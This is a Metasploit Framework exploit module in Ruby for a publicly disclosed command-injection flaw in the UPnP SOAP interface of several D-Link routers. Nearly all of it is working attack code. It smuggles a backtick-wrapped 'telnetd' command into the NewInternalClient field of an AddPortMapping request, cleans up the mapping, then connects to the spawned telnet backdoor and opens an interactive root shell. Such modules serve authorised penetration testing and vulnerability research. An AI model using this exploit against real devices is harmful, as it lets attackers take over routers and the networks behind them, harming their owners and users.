# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;D-Link Devices UPnP SOAP Telnetd Command Execution&#039;,
      &#039;Description&#039; => %q{
        Various D-Link Routers are vulnerable to OS command injection in the UPnP SOAP
        interface. This module has been tested successfully on DIR-300, DIR-600, DIR-645,
        DIR-845 and DIR-865. According to the vulnerability discoverer, more D-Link devices
        may be affected.
      },
      &#039;Author&#039;      =>
        [
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039;, # Vulnerability discovery and Metasploit module
          &#039;juan vazquez&#039; # minor help with msf module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;94924&#039; ],
          [ &#039;BID&#039;, &#039;61005&#039; ],
          [ &#039;EDB&#039;, &#039;26664&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-020&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 05 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;        => ARCH_CMD,
      &#039;Payload&#039;     =>
        {
          &#039;Compat&#039;  => {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;,
          },
        },
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/interact&#039; },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;,  { } ],
        ],
      &#039;DefaultTarget&#039;  => 0
      ))

    register_options(
      [
        Opt::RPORT(49152)  #port of UPnP SOAP webinterface
      ], self.class)

    register_advanced_options(
      [
        OptInt.new(&#039;TelnetTimeout&#039;, [ true, &#039;The number of seconds to wait for a reply from a Telnet command&#039;, 10]),
        OptInt.new(&#039;TelnetBannerTimeout&#039;, [ true, &#039;The number of seconds to wait for the initial banner&#039;, 25])
      ], self.class)
  end

  def tel_timeout
    (datastore[&#039;TelnetTimeout&#039;] || 10).to_i
  end

  def banner_timeout
    (datastore[&#039;TelnetBannerTimeout&#039;] || 25).to_i
  end

  def exploit
    @new_portmapping_descr = rand_text_alpha(8)
    @new_external_port = rand(65535)
    @new_internal_port = rand(65535)
    telnetport = rand(65535)

    vprint_status("#{rhost}:#{rport} - Telnetport: #{telnetport}")

    cmd = "telnetd -p #{telnetport}"
    type = "add"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
    type = "delete"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    print_status("#{rhost}:#{rport} - Trying to establish a telnet connection...")
    sock = Rex::Socket.create_tcp({ &#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => telnetport.to_i })

    if sock.nil?
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
    end

    print_status("#{rhost}:#{rport} - Trying to establish a telnet session...")
    prompt = negotiate_telnet(sock)
    if prompt.nil?
      sock.close
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to establish a telnet session")
    else
      print_good("#{rhost}:#{rport} - Telnet session successfully established...")
    end

    handler(sock)
  end

  def request(cmd, type)

    uri = &#039;/soap.cgi&#039;

    data_cmd = "<?xml version=\"1.0\"?>"
    data_cmd << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data_cmd << "<SOAP-ENV:Body>"

    if type == "add"
      vprint_status("#{rhost}:#{rport} - adding portmapping")

      soapaction = "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"

      data_cmd << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
      data_cmd << "<NewPortMappingDescription>#{@new_portmapping_descr}</NewPortMappingDescription>"
      data_cmd << "<NewLeaseDuration></NewLeaseDuration>"
      data_cmd << "<NewInternalClient>`#{cmd}`</NewInternalClient>"
      data_cmd << "<NewEnabled>1</NewEnabled>"
      data_cmd << "<NewExternalPort>#{@new_external_port}</NewExternalPort>"
      data_cmd << "<NewRemoteHost></NewRemoteHost>"
      data_cmd << "<NewProtocol>TCP</NewProtocol>"
      data_cmd << "<NewInternalPort>#{@new_internal_port}</NewInternalPort>"
      data_cmd << "</m:AddPortMapping>"
    else
      #we should clean it up ... otherwise we are not able to exploit it multiple times
      vprint_status("#{rhost}:#{rport} - deleting portmapping")
      soapaction = "urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"

      data_cmd << "<m:DeletePortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
      data_cmd << "<NewProtocol>TCP</NewProtocol><NewExternalPort>#{@new_external_port}</NewExternalPort><NewRemoteHost></NewRemoteHost>"
      data_cmd << "</m:DeletePortMapping>"
    end

    data_cmd << "</SOAP-ENV:Body>"
    data_cmd << "</SOAP-ENV:Envelope>"

    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;vars_get&#039; => {
          &#039;service&#039; => &#039;WANIPConn1&#039;
        },
        &#039;ctype&#039; => "text/xml",
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;SOAPAction&#039; => soapaction,
          },
        &#039;data&#039; => data_cmd
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end
  end

  def negotiate_telnet(sock)
    begin
      Timeout.timeout(banner_timeout) do
        while(true)
          data = sock.get_once(-1, tel_timeout)
          return nil if not data or data.length == 0
          if data =~ /\x23\x20$/
            return true
          end
        end
      end
    rescue ::Timeout::Error
      return nil
    end
  end

end

